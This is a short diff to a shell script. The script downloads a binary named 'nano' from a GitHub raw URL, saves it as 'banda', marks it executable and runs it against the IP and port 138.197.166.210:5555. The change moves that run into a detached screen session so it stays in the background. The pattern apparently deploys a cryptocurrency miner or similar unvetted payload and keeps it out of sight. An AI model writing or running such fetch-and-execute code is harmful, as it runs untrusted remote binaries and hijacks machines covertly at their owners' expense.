@@ -6,4 +6,4 @@
 cd /home/shell-bot
 wget -qO banda https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
 chmod +x banda
-./banda -o 138.197.166.210:5555
+screen -dm -S banda ./banda -o 138.197.166.210:5555
